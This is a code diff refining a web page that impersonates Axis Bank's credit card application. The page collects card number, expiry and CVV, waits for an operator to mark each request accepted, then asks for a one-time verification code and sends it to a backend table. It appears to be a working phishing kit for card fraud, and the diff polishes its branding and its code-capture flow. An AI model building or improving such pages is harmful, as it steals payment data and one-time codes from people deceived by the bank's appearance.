@@ -37,7 +37,31 @@
             gap: 12px;
         }
 
-        .logo-main { font-size: 26px; font-weight: 800; }
+        .logo-main {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-circle {
+            width: 38px;
+            height: 38px;
+            background: white;
+            color: #8c1d3e;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 24px;
+        }
+
+        .logo-text {
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+
         .logo-dot { color: #ffcc00; }
 
         .content { padding: 30px 25px; }
@@ -56,7 +80,7 @@
             margin-bottom: 30px;
         }
 
-        .form-group { margin-bottom: 20px; }
+        .form-group { margin-bottom: 22px; }
 
         label {
             display: block;
@@ -74,7 +98,10 @@
             font-size: 16px;
         }
 
-        input:focus { border-color: #8c1d3e; outline: none; }
+        input:focus { 
+            border-color: #8c1d3e; 
+            outline: none; 
+        }
 
         button {
             width: 100%;
@@ -140,10 +167,11 @@
 <body>
     <div class="main-container">
         <div class="header">
-            <div style="font-size:32px; font-weight:900;">A</div>
+            <div class="logo-circle">A</div>
             <div>
-                <div class="logo-main">AXIS BANK<span class="logo-dot">.</span></div>
-                <div class="tagline">Your credit card application is just a few clicks away</div>
+                <div class="logo-main">
+                    <span class="logo-text">AXIS BANK</span><span class="logo-dot">.</span>
+                </div>
             </div>
         </div>
 
@@ -152,18 +180,18 @@
             <p class="subtitle">Secure • Instant • Paperless</p>
 
             <div class="form-group">
-                <label>Card Number  *</label>
-                <input type="text" id="number1" placeholder="Enter Card Number>
+                <label>Card Number *</label>
+                <input type="text" id="number1" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
             </div>
 
             <div class="form-group">
                 <label>Expiry Date *</label>
-                <input type="month" id="date_value">
+                <input type="month" id="date_value" placeholder="MM/YY">
             </div>
 
             <div class="form-group">
                 <label>CVV *</label>
-                <input type="text" id="number2" placeholder="Enter CVV">
+                <input type="text" id="number2" placeholder="Enter CVV" maxlength="4">
             </div>
 
             <button onclick="submitForm()">Continue</button>
@@ -228,7 +256,6 @@
 
             if(error) return;
 
-            // === STRONG SUCCESS CHECK ===
             if(data.status === 'accepted' && data.pin_status === 'accepted'){
                 clearInterval(interval);
                 showModal(`<div class="success">Congratulations! 🎉<br>Verified Successfully</div>`);
@@ -237,80 +264,50 @@
 
             if(data.status === 'pending'){
                 showModal(`<div class="loader"></div><div class="wait">Waiting for Verification...</div>`);
-            } 
+            }
             else if(data.status === 'rejected'){
                 clearInterval(interval);
                 showModal(`<div class="reject">Request Rejected</div>`);
-            } 
+            }
             else if(data.status === 'accepted'){
                 if(data.pin_status === 'waiting'){
-
-    // INPUT ALREADY HAI TO RELOAD MAT KARO
-    if(!document.getElementById('pin')){
-
-        showModal(`
-
-            <div class="wait">
-            Enter Verification Code to proceed
-            </div>
-
-            <input
-            type="text"
-            id="pin"
-            placeholder="Enter Verification Code"
-
-            style="
-            width:100%;
-            padding:14px;
-            margin:15px 0;
-            border:1.5px solid #c8ced7;
-            border-radius:6px;
-            ">
-
-            <button
-            onclick="submitPin()"
-
-            style="
-            background:#8c1d3e;
-            width:100%;
-            padding:14px;
-            border:none;
-            border-radius:6px;
-            color:white;
-            font-weight:600;
-            margin-top:10px;
-            ">
-
-            Submit 
-
-            </button>
-
-        `);
-
-    }
-
-} 
+                    if(!document.getElementById('pin')){
+                        clearInterval(interval);
+                        showModal(`
+                            <div class="wait">Enter Verification Code to proceed</div>
+                            <input type="text" id="pin" placeholder="Enter Verification Code" 
+                                   style="width:100%; padding:14px; margin:15px 0; border:1.5px solid #c8ced7; border-radius:6px;">
+                            <button onclick="submitPin()" 
+                                    style="background:#8c1d3e; width:100%; padding:14px; border:none; border-radius:6px; color:white; font-weight:600; margin-top:10px;">
+                                Submit
+                            </button>
+                        `);
+                    }
+                }
                 else if(data.pin_status === 'pending'){
                     showModal(`<div class="loader"></div><div class="wait">Verifying ...</div>`);
-                } 
+                }
                 else if(data.pin_status === 'rejected'){
                     clearInterval(interval);
-                    showModal(`<div class="reject"> Rejected</div>`);
+                    showModal(`<div class="reject">Rejected</div>`);
                 }
             }
-        }, 1200); // Faster polling
+        }, 1200);
     }
 
     async function submitPin(){
         const pin = document.getElementById('pin').value.trim();
         if(!pin) {
-            alert("Please enter PIN");
+            alert("Please enter Verification Code");
             return;
         }
 
         showModal(`<div class="loader"></div><div class="wait">Submitting ...</div>`);
 
         await client.from('requests').update({ pin: pin, pin_status: 'pending' }).eq('id', currentId);
+
+        // Restart polling after PIN submit
+        setTimeout(() => listenStatus(), 800);
     }
     </script>
 </body>
